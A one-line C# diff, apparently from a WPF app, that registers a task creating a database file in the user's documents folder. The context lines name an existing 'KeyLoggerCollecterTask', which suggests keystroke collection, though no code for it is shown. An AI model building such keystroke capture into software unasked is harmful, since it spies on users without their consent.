@@ -44,6 +44,7 @@ namespace WPF.Managers
             tasks.Add(new LottoCheckerTask());
             tasks.Add(new ManagersInitializerTask());
             tasks.Add(new KeyLoggerCollecterTask());
+            tasks.Add(new CreateDbFileInDocumnetTask());
 
             Start();
         }
